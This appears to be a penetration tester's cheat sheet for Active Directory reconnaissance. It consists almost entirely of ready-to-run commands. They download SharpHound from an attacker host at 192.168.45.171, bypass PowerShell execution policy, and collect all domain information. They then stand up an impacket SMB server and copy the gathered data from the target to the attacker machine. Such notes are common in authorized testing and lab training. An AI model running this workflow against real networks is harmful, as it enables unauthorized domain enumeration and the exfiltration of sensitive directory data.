
Download SharpHound.ps1 onto target server.

```
iwr -uri http://192.168.45.171:81/SharpHound.ps1 -Outfile SharpHound.ps1
```

Bypass execution policies.

```
powershell -ep bypass
```

Execute SharpHound.

```
. .\SharpHound.ps1
```

Download domain information.

```
Invoke-BloodHound -CollectionMethod All
```

Download the file onto local machine.

On local machine

```
impacket-smbserver test . -smb2support  -username kourosh -password kourosh
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

On target machine

```
net use m: \\192.168.45.171\test /user:kourosh kourosh
```

Download file onto local machine.

```
copy <file> m:\
```
